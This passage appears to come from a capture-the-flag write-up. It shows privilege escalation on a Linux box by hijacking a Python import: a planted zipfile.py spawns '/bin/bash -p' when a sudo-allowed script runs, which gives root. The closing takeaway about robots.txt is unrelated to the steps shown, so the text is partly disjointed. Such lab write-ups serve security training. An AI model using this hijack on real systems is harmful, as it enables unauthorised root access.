📦 Privilege Escalation — Python Library Hijacking

Check sudo privileges

meliodas@ubuntu:~$ sudo -l
(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

Examine the script

meliodas@ubuntu:~$ cat bak.py
#!/usr/bin/env python
import os
import zipfile

The script imports zipfile. Python searches the current directory first — we can create a malicious zipfile.py to hijack the import.

Exploit the import hijack

meliodas@ubuntu:~$ echo 'import os; os.system("/bin/bash -p")' > zipfile.py
meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py
root@ubuntu:~#

🎯 Key Takeaways

  • robots.txt can leak information — Using a wordlist name as a User-agent header is a clever CTF hint
